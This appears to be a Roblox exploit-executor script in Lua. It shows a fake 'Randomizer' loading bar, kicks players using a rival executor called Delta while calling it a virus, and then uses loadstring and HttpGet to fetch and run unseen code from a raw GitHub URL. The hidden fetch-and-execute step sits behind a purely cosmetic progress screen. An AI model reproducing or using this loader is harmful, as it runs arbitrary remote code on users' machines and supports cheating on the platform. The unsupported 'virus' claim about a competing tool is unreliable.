local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local plr = Players.LocalPlayer
local userId = plr.UserId

-- 🛑 Delta Exploit Detection and Kick
task.spawn(function()
	local detected = false

	local success, result = pcall(function()
		return identifyexecutor and identifyexecutor()
	end)

	if success and result then
		if tostring(result):lower():find("delta") then
			detected = true
		end
	end

	if getgenv then
		for k, v in pairs(getgenv()) do
			if tostring(k):lower():find("delta") or tostring(v):lower():find("delta") then
				detected = true
				break
			end
		end
	end

	if detected then
		plr:Kick("❗ Delta exploit detected. You have been kick for safety, Use Krnl!")
	end
end)

-- ✅ GUI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RandomizerGUI"
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(0, 400, 0, 180)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BorderSizePixel = 0

-- ❗ Bottom Warning Text
local WarningText = Instance.new("TextLabel")
WarningText.Parent = Frame
WarningText.AnchorPoint = Vector2.new(0.5, 1)
WarningText.Position = UDim2.new(0.5, 0, 1, 0)
WarningText.Size = UDim2.new(1, 0, 0, 25)
WarningText.BackgroundTransparency = 1
WarningText.TextColor3 = Color3.fromRGB(255, 0, 0)
WarningText.Font = Enum.Font.GothamBlack
WarningText.TextScaled = true
WarningText.Text = "❗DON'T USE DELTA IT'S A VIRUS IF YOU'RE USING ONE❗"
WarningText.TextTransparency = 0

-- Fade out warning after 3 seconds
task.delay(3, function()
	local fadeTween = TweenService:Create(WarningText, TweenInfo.new(1), {
		TextTransparency = 1
	})
	fadeTween:Play()
	fadeTween.Completed:Wait()
	WarningText:Destroy()
end)

-- Avatar image
local AvatarImage = Instance.new("ImageLabel")
AvatarImage.Parent = Frame
AvatarImage.Position = UDim2.new(0, 10, 0, 10)
AvatarImage.Size = UDim2.new(0, 50, 0, 50)
AvatarImage.BackgroundTransparency = 1
AvatarImage.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
AvatarImage.ScaleType = Enum.ScaleType.Fit

-- Title
local Title = Instance.new("TextLabel")
Title.Parent = Frame
Title.Position = UDim2.new(0.5, 0, 0, 10)
Title.AnchorPoint = Vector2.new(0.5, 0)
Title.Size = UDim2.new(0.8, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "Randomizer"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextScaled = true

-- Loading percent text
local PercentText = Instance.new("TextLabel")
PercentText.Parent = Frame
PercentText.Position = UDim2.new(0.5, 0, 0, 45)
PercentText.AnchorPoint = Vector2.new(0.5, 0)
PercentText.Size = UDim2.new(0.8, 0, 0, 25)
PercentText.BackgroundTransparency = 1
PercentText.Text = "Loading: 0%"
PercentText.TextColor3 = Color3.fromRGB(200, 200, 200)
PercentText.Font = Enum.Font.Gotham
PercentText.TextScaled = true

-- Progress bar background
local ProgressBarBG = Instance.new("Frame")
ProgressBarBG.Parent = Frame
ProgressBarBG.Position = UDim2.new(0.05, 0, 0.55, 0)
ProgressBarBG.Size = UDim2.new(0.9, 0, 0.15, 0)
ProgressBarBG.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
ProgressBarBG.BorderSizePixel = 0

-- Progress bar fill
local ProgressBar = Instance.new("Frame")
ProgressBar.Parent = ProgressBarBG
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
ProgressBar.BorderSizePixel = 0

-- Subtitle
local Subtitle = Instance.new("TextLabel")
Subtitle.Parent = Frame
Subtitle.Position = UDim2.new(0, 0, 0.8, 0)
Subtitle.Size = UDim2.new(1, 0, 0.15, 0)
Subtitle.BackgroundTransparency = 1
Subtitle.Text = "Loading by ProjectB"
Subtitle.Font = Enum.Font.Gotham
Subtitle.TextScaled = true

-- 🌈 RGB color cycle for subtitle
task.spawn(function()
	while true do
		for hue = 0, 1, 0.01 do
			local color = Color3.fromHSV(hue, 1, 1)
			Subtitle.TextColor3 = color
			task.wait(0.05)
		end
	end
end)

-- 📊 Animate progress bar and loading text
local loadTime = 5

TweenService:Create(ProgressBar, TweenInfo.new(loadTime, Enum.EasingStyle.Linear), {
	Size = UDim2.new(1, 0, 1, 0)
}):Play()

task.spawn(function()
	local startTime = tick()
	local connection

	connection = RunService.RenderStepped:Connect(function()
		local elapsed = tick() - startTime
		local percent = math.clamp((elapsed / loadTime) * 100, 0, 100)
		PercentText.Text = ("Loading: %d%%"):format(math.floor(percent + 0.5))

		if elapsed >= loadTime then
			connection:Disconnect()
			ScreenGui:Destroy()

loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectBScripts/Loadingv2/refs/heads/main/Lolers"))()				
		end
	end)
end)
